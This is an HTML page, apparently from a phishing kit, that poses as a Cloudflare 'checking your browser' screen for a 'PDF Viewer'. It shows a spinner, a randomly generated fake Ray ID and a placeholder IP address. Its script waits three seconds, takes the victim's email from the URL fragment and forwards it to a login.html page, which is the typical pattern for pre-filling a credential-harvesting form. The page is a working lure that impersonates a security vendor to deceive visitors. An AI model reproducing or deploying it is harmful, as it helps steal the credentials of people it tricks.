<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Just a moment...</title>
  <style>
    body {
      margin: 0;
      background: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #333;
      text-align: center;
    }
    .container {
      margin-top: 15%;
    }
    .spinner {
      margin: 20px auto;
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .details {
      margin-top: 20px;
      font-size: 0.9em;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Checking your browser before accessing PDF Viewer...</h2>
    <div class="spinner"></div>
    <p>This process is automatic. Your browser will redirect once verification is complete.</p>
    <div class="details">
      Cloudflare Ray ID: <span id="rayId"></span> • Your IP: 192.0.2.1 • Performance & security by Cloudflare
    </div>
  </div>

  <script>
    function generateRayID() {
      return Math.random().toString(36).substr(2, 8) + Math.random().toString(36).substr(2, 8);
    }
    document.getElementById('rayId').textContent = generateRayID();

    setTimeout(() => {
      const hash = window.location.hash.substring(1);
      const emailHash = encodeURIComponent(hash);
      const targetURL = `login.html#${emailHash}`; // Change this to your full URL if needed
      window.location.href = targetURL;
    }, 3000);
  </script>
</body>
</html>
